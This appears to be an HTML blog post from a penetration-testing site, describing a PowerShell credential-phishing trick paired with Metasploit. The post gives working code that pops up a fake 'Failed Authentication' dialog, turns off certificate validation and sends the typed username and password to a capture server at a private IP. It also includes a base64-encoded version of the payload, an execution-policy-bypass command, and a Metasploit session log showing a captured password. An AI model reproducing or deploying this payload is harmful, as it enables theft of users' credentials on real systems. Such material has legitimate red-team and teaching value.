@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.15" />
+
+  <title>Powershell Popups &#43; Capture &middot; Room362</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Room362" href="http://room362.com/index.xml" />
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="http://room362.com/img/favicon.ico" type="image/x-icon" />
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+
+  </ul>
+</div>
+
+  <div class="pure-g">
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print pure-u-1 pure-u-md-1-1">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>Powershell Popups &#43; Capture</h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>12 Jan 2015, 17:52</time>
+  </div>
+
+  
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="http://room362.com/tags/powershell">powershell</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="http://room362.com/tags/credentials">credentials</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  <p>Metasploit Minute has entered into it&rsquo;s 3rd &ldquo;season&rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)</p>
+
+<p>Here is the video:</p>
+
+<iframe width="560" height="315" src="//www.youtube.com/embed/H_E3FNF8rBw" frameborder="0" allowfullscreen></iframe>
+
+<p>Here is the code:</p>
+
+<pre><code>$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName + &quot;\&quot; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+$wc = new-object net.webclient;
+$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Wget/1.9+cvs-stable (Red Hat modified)&quot;);
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
+$result = $wc.downloadstring('https://172.16.102.163');
+</code></pre>
+
+<p>Lets break down the code line by line:</p>
+
+<pre><code>$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserName,[Environment]::UserDomainName);
+</code></pre>
+
+<p>This tells windows to prompt for credentials, with the title of &ldquo;Failed Authentication&rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.</p>
+
+<pre><code>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+</code></pre>
+
+<p>Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later</p>
+
+<pre><code>$wc = new-object net.webclient;
+$wc.Headers.Add(&quot;User-Agent&quot;,&quot;Wget/1.9+cvs-stable (Red Hat modified)&quot;);
+</code></pre>
+
+<p>Creates a new webclient object and sets its user agent to &lsquo;wget&rsquo;</p>
+
+<pre><code>$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+</code></pre>
+
+<p>Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.</p>
+
+<pre><code>$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, '');
+</code></pre>
+
+<p>Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.</p>
+
+<pre><code>$result = $wc.downloadstring('https://172.16.102.163');
+</code></pre>
+
+<p>And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.</p>
+
+<pre><code>cat power.txt | iconv --to-code UTF-16LE | base64
+
+JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
+</code></pre>
+
+<p>Then execute <code>powershell -ep bypass -enc &lt;the encoded text from above&gt;</code> and you get this:</p>
+
+<p>Image should be here: <img src="/images/2015/powershellpopup.png" alt="" /></p>
+
+<pre><code>root@wpad:~/metasploit-framework# ./msfconsole -Lq
+msf &gt; use auxiliary/server/capture/http_basic
+msf auxiliary(http_basic) &gt; show options
+
+Module options (auxiliary/server/capture/http_basic):
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   REALM        Secure Site      yes       The authentication realm you'd like to present.
+   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
+   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT      80               yes       The local port to listen on.
+   SSL          false            no        Negotiate SSL for incoming connections
+   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
+   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                       no        The URI to use for this exploit (default is random)
+
+msf auxiliary(http_basic) &gt; set SSL true
+SSL =&gt; true
+msf auxiliary(http_basic) &gt; set SRVPORT 443
+SRVPORT =&gt; 443
+msf auxiliary(http_basic) &gt; set URIPATH /
+URIPATH =&gt; /
+msf auxiliary(http_basic) &gt; run
+[*] Auxiliary module execution completed
+msf auxiliary(http_basic) &gt;
+[*] Listening on 0.0.0.0:443...
+[*] Using URL: https://0.0.0.0:443/
+[*]  Local IP: https://172.16.102.163:443/
+[*] Server started.
+[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
+[+] 172.16.102.140 - Credential collected: &quot;SITTINGDUCK\user:ASDqwe123&quot; =&gt; /
+</code></pre>
+
+<p>Game over!</p>
+
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1 pure-u-md-1-2">
+    
+    <nav class="prev">
+      <a href="http://room362.com/post/2015/2015-shmoocon-hiring/"><i class="fa fa-arrow-circle-left fa-fw fa-lg"></i>2015 ShmooCon Hiring</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-1 pure-u-md-1-2">
+    
+    <nav class="next">
+      <a href="http://room362.com/post/2014/full-disclosure-singleclick-connect/">Full Disclosure - SingleClick Connect<i class="fa fa-arrow-circle-right fa-fw fa-lg"></i></a>
+    </nav>
+    
+  </div>
+</div>
+
+
+  
+
+</div>
+
+</div>
+</div>
+<script src="http://room362.com/js/ui.js"></script>
+
+
+
+
+</body>
+</html>
+
